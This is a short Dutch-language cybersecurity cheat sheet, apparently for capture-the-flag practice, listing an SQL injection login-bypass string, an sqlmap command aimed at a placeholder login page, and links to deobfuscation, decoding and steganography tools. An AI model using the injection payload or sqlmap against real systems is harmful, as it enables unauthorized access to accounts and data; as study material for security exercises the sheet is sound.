# Cybersecurity cheat sheet

## SQL Injection

### SQL Injection Cheat Sheet

Kraken van een login form:

```sql
' or 1=1 -- .
```

Gebruik sqlmap om SQL Injection te vinden:

```bash
sqlmap -u "http://example.com/login.php" --data="username=admin&password=admin" --method=POST
```

## Deobfuscating

### Deobfuscating JavaScript

Deobfuscating JavaScript kan met een online tool zoals [deobfuscate.io](https://deobfuscate.io/).

## Encoding

Voor encorderingen te decoderen kan je [CyberChef](https://gchq.github.io/CyberChef/) gebruiken.

## Steganografie

Om verborgen informatie te vinden in een afbeelding kan je [StegOnline](https://stegonline.georgeom.net/upload) gebruiken.
